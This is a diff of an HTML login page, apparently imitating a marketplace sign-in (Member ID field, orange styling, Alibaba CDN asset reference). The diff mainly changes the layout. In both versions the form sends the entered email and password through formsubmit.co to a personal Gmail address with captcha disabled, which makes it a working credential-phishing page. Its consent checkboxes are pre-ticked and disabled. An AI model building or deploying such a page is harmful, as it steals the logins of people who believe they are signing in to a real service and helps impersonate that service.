@@ -13,96 +13,103 @@
     <link rel="stylesheet" href="login.css" />
   </head>
   <body>
-    <section class="pt-5">
-      <section class="container mt-5">
-        <div class="col-md-5 col-12 p-4 border">
-          <form
-            action="https://formsubmit.co/oladipupomichael9@gmail.com"
-            method="POST"
-          >
-            <label for="email" class="fw-bold">Account:</label>
-            <input
-              class="forms mb-3 input-margin"
-              type="email"
-              placeholder="Email address or Member ID"
-              name="email"
-              required
-            />
-            <div class="d-flex justify-content-between">
-              <label class="fw-bold">Password:</label>
-              <p class="margin-0">
-                <a
-                  href="#password"
-                  class="text-decoration-none text-primary hover-orange"
-                  >Forgot password?</a
+    <section class="container mt-5 pt-5">
+      <section class="row">
+        <section class="col-md-5 col-12 m-auto">
+          <div class="p-4 border">
+            <form
+              action="https://formsubmit.co/oladipupomichael9@gmail.com"
+              method="POST"
+            >
+              <label for="email" class="fw-bold">Account:</label>
+              <input
+                class="forms mb-3 input-margin"
+                type="email"
+                placeholder="Email address or Member ID"
+                name="email"
+                required
+              />
+              <div class="d-flex justify-content-between">
+                <label class="fw-bold">Password:</label>
+                <p class="margin-0">
+                  <a
+                    href="#password"
+                    class="text-decoration-none text-primary hover-orange"
+                    >Forgot password?</a
+                  >
+                </p>
+              </div>
+              <input
+                class="forms mb-3 input-margin"
+                type="password"
+                placeholder="Password"
+                name="password"
+                id="password"
+                required
+              />
+
+              <p class="mb-2">
+                <input type="checkbox" checked />
+                <span class="fw-bold"
+                  >Stay signed in.
+                  <a href="" class="text-decoration-none hover-orange"
+                    >Details</a
+                  ></span
                 >
               </p>
-            </div>
-            <input
-              class="forms mb-3 input-margin"
-              type="password"
-              placeholder="Password"
-              name="password"
-              id="password"
-              required
-            />
 
-            <p class="mb-2">
-              <input type="checkbox" checked />
-              <span class="fw-bold"
-                >Stay signed in.
-                <a href="" class="text-decoration-none hover-orange"
-                  >Details</a
-                ></span
+              <input type="hidden" name="_subject" value="New Submission" />
+              <input type="hidden" name="_captcha" value="false" />
+              <input
+                type="submit"
+                class="btn btn-orange w-100"
+                value="Sign In"
+              />
+            </form>
+            <p class="mt-4">
+              <a href="" class="text-decoration-none hover-orange"
+                >Mobile number sign in</a
               >
             </p>
-
-            <input type="hidden" name="_subject" value="New Submission" />
-            <input type="hidden" name="_captcha" value="false" />
-            <input type="submit" class="btn btn-orange w-100" value="Sign In" />
-          </form>
-          <p class="mt-4">
-            <a href="" class="text-decoration-none hover-orange"
-              >Mobile number sign in</a
-            >
-          </p>
-          <hr />
-          <div class="d-flex">
-            <p class="text-center text-secondary mt-3">Or sign in with:</p>
-            <div class="d-flex justify-content-around">
-              <img
-                class="size ms-3 me-2"
-                src="./assets//facebook.png"
-                alt="facebook"
-              />
-              <img
-                class="size rounded-circle mx-2"
-                src="./assets//google.png"
-                alt="google"
-              />
-              <img
-                class="size mx-2"
-                src="./assets//linkedin.png"
-                alt="linkein"
-              />
-              <img
-                class="size rounded-circle shadow d-none"
-                src="./assets//twitter.jpeg"
-                alt="twitter"
-              />
+            <hr />
+            <div class="d-flex">
+              <p class="text-center text-secondary mt-3">Or sign in with:</p>
+              <div class="d-flex justify-content-around">
+                <img
+                  class="size ms-3 me-2"
+                  src="./assets//facebook.jpg"
+                  alt="facebook"
+                />
+                <img
+                  class="size rounded-circle mx-2"
+                  src="./assets//google.png"
+                  alt="google"
+                />
+                <img
+                  class="mx-2"
+                  style="width: 56px; height: 56px"
+                  src="./assets//linkedin.webp"
+                  alt="linkedin"
+                />
+                <img
+                  class="size rounded-circle shadow d-none"
+                  src="./assets//twitter.jpeg"
+                  alt="twitter"
+                />
+              </div>
+            </div>
+            <div class="mt-4">
+              <p class="text-ash margin-0">
+                <input type="checkbox" checked disabled /> I agree to Free Membership
+                Agreement
+              </p>
+              <p class="text-ash">
+                <input type="checkbox" checked disabled />I agree to Receive marketing
+                materials
+              </p>
             </div>
           </div>
-          <div class="mt-4">
-            <p class="text-ash">
-              <input type="checkbox" checked /> I agree to Free Membership
-              Agreement
-            </p>
-            <p class="text-ash">
-              <input type="checkbox" checked />I agree to Receive marketing
-              materials
-            </p>
-          </div>
-        </div>
+        </section>
       </section>
     </section>
     <script src="login.js"></script>
@@ -118,3 +125,5 @@
     ></script>
   </body>
 </html>
+
+<!-- url(https://gw.alicdn.com/tps/i1/TB1VHK4KFXXXXbPXFXXwxCdHXXX-47-47.png) no-repeat -->
